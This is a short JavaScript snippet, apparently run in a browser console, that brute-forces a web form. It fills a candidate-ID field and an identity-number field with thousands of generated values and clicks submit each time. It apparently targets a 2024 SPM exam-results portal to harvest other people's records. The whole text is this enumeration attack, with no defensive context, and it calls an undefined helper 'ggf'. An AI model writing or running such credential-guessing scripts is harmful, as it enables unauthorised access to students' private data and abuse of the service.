angka = [33,42,43,48,54,56,63,64,74,85,87,88,91,104];
valid = [];
for (i of angka) {
		document.querySelector("#floatingInput").value = "MA303A" + ("000" + i).slice(-3);
		for (ic2 of [1,2,4,5,6,7,10,14]) {
				ic = 1;
				while (ic < 2000) {
						document.querySelector("#floatingKP").value = "000000" + ("00" + ic2).slice(-2) +  ("0000" + ic).slice(-4);
						document.querySelector("#hantar").click();
						valid.push(ic, ggf("SPM", "2024"));
						ic += 2;
				}
		}
}
